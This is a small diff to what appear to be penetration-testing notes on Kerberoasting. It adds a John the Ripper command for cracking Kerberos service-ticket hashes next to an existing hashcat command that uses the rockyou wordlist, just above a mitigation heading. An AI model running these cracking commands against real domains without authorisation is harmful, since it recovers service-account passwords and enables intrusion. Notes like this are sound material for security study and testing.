@@ -56,7 +56,8 @@ Invoke-kerberoast
 
 crack hash :
 ```bash
-hashcat -m 13100 GetUserSPNs1.out /usr/share/wordlists/rockyou.txt.gz 
+hashcat -m 13100 GetUserSPNs1.out /usr/share/wordlists/rockyou.txt.gz
+sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot
 ```
 
 Mitigation :
